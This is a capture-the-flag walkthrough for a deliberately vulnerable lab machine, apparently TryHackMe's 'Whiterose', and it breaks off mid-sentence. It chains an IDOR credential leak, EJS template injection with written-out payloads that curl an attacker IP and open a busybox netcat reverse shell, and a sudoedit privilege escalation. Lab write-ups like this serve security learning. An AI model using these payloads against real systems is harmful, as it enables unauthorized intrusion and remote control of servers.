# Whiterose

<img width="414" height="153" alt="image" src="https://github.com/user-attachments/assets/87cced20-c3f2-470d-bfce-4cc7e44a4eb7" />

## Questions: 
- What's Tyrell Wellick's phone number?

- What is the user.txt flag?

- What is the root.txt flag?

## Reconnaissance/Enumeration:

<img width="1011" height="711" alt="image" src="https://github.com/user-attachments/assets/27c0591e-06a6-47d0-a89a-a967670bde85" />

- We perform and nmap scan on the target machine, and we found two ports open
  - Port 22
  - Port 80

<img width="861" height="388" alt="image" src="https://github.com/user-attachments/assets/b9b7ae04-327d-4a50-b198-241191c22bda" />

- We checked for subdirectories but didn't find anything. However, when we checked a subdomain, we found 'www' and 'admin', with 'admin' leading to a new page we do not yet know about.

  <img width="551" height="22" alt="image" src="https://github.com/user-attachments/assets/668a66f3-3fdc-4a8d-ab70-6665643e44bb" />

- Before accessing the target website, I updated the local hosts file using:

  - `sudo nano /etc/hosts`

- I added an entry that maps the target machine's IP address to its hostname. This allows the system to resolve the target domain locally instead of relying on external DNS.

<img width="1349" height="605" alt="image" src="https://github.com/user-attachments/assets/78d33dea-6df0-4c36-bb8b-93867a82e61e" />

<img width="585" height="317" alt="image" src="https://github.com/user-attachments/assets/a38ee3c5-16ba-4875-b0c2-01e74033bb3c" />


- Now we head to admin.cyprusbank.thm and use the credentials that have been given to us to log in to the admin panel.

## Exploitation:

<img width="1228" height="729" alt="image" src="https://github.com/user-attachments/assets/5065724a-7830-45af-a699-c741875dbaaa" />

<img width="1207" height="591" alt="image" src="https://github.com/user-attachments/assets/93b3f7bd-bcc8-44b1-a3cc-565f8be0d1e0" />

- Upon reviewing the URL in the messages directory, we see that it includes the parameter `?c=5` during the visit. This parameter, `c`, can be examined for Insecure Direct Object References (IDOR). 
- By changing the parameter value to `0`, we can access the credentials of an admin user named Gayle Bev.

<img width="1323" height="488" alt="image" src="https://github.com/user-attachments/assets/2901d01f-3789-4f27-9265-c131728281a0" />

- After logging in as Gayle, we are now able to read the telephone numbers, including Tyrell Wellick's number.

<img width="1418" height="412" alt="image" src="https://github.com/user-attachments/assets/b0137559-d5fe-4c6d-a3b4-a95ca9986b02" />

- As Gayle Bev we do have access to the settings endpoint. We can set the customer's passwords here. What is noticeable is that the passwords are reflected. This immediately draws attention to XSS or SSTI.

<img width="768" height="326" alt="image" src="https://github.com/user-attachments/assets/311db4af-79e9-4afb-94e8-44c94d3b9dac" />

- If we intercept a request and change it by omitting parameters such as the password, an error message appears. This tells us that ejs files are included.

<img width="1248" height="357" alt="image" src="https://github.com/user-attachments/assets/1e81d2c1-05d2-491d-800e-3052446e0cbb" />

<img width="647" height="130" alt="image" src="https://github.com/user-attachments/assets/1e824f80-2249-4378-92c8-bc9a4f265cbb" />

- We use the payload from the article and first try to call our web server to test whether it works.
  - `%%1");process.mainModule.require('child_process').execSync('curl http://<IP>');//`
 
<img width="1153" height="598" alt="image" src="https://github.com/user-attachments/assets/88ccb189-5d96-4d97-adb8-cd947e42f7c2" />


- Next, we prepare a revshell. We use a simple base64-encoded BusyBox reverse shell, generated with revshells.com
- Next, we set up a listener and use the following payload to spawn a reverse shell.
  - `&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc <IP> 4444 -e bash');//`
 
<img width="819" height="142" alt="image" src="https://github.com/user-attachments/assets/422da59c-3df5-454d-8b47-f7bd4dd441d6" />

- We receive a connection back and are the user web. In the home directory of web we find the first flag. After we have received our reverse shell, we then upgrade it.
  - **Upgrade to Interactive Shell:**
    - python3 -c 'import pty; pty.spawn("/bin/bash")'
    - export TERM=xterm
    - CTRL+Z
    - stty raw -echo
    - Fg
   
<img width="412" height="164" alt="image" src="https://github.com/user-attachments/assets/eda9b904-0701-4338-bf13-007078889a57" />

- After we received our upgraded shell, we moved around, and it didn't take us long to find user.txt, which contains the first flag.



<img width="1657" height="731" alt="image" src="https://github.com/user-attachments/assets/0e333696-f55f-49dc-abd8-98d458b5182d" />


<img width="417" height="100" alt="image" src="https://github.com/user-attachments/assets/8bf1488f-b391-44e1-842c-1848bd10da8c" />


- To find out if we can escalte privilages, we checked sudo privil;eges by entering:
  - sudo -l
- We found out out that we can run sudoedit as toot with no password. So we use the serach engione to find out what we can dio and we checed out this github link:
  - https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc
Accoringing to this exploit, this exploit with succesfully wor if the system sudo version is 1.8.0 to 1.9.12p1.  We cheched the version by running:
  - sudo -V
And we get sudo 1.9.12p1, which is perfect. after downloading and runnign the script, 
